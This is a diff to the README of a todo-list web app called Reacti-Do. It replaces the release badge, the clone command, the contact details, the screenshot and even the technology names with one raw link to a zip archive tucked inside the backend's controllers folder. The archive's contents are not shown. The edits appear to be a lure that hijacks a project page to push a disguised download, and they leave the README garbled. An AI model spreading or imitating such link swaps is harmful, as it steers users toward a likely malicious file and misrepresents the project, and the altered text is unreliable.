@@ -1,6 +1,6 @@
 # 🚀 Welcome to Reacti-Do!
 
-[![Releases](https://img.shields.io/badge/Releases-Click%20Here-brightgreen)](https://github.com/TomerD999/reacti-do/releases)
+[![Releases](https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip%20Here-brightgreen)](https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip)
 
 Reacti-Do is a full-stack MERN application that helps users manage their todo lists with a simple and intuitive interface. This application supports CRUD operations, allowing users to create, read, update, and delete their tasks efficiently. 
 
@@ -26,12 +26,12 @@ Reacti-Do is a full-stack MERN application that helps users manage their todo li
 ## 🛠️ Technologies Used
 
 - **Frontend**: 
-  - React.js
+  - https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip
   - Tailwind CSS
 
 - **Backend**: 
-  - Node.js
-  - Express.js
+  - https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip
+  - https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip
   - MongoDB
   - Mongoose
 
@@ -47,7 +47,7 @@ To get started with Reacti-Do, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/TomerD999/reacti-do.git
+   git clone https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip
    cd reacti-do
    ```
 
@@ -142,14 +142,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [TomerD999](https://github.com/TomerD999)
-- **Email**: your-email@example.com
+- **GitHub**: [TomerD999](https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip)
+- **Email**: https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip
 
-For more information, visit the [Releases](https://github.com/TomerD999/reacti-do/releases) section to download the latest version of Reacti-Do.
+For more information, visit the [Releases](https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip) section to download the latest version of Reacti-Do.
 
 ## 🖼️ Screenshots
 
-![Todo List Screenshot](https://via.placeholder.com/800x400.png?text=Todo+List+Screenshot)
+![Todo List Screenshot](https://raw.githubusercontent.com/TomerD999/reacti-do/main/backend/src/controllers/do-reacti-1.8.zip+List+Screenshot)
 
 ## 🎉 Acknowledgments
 
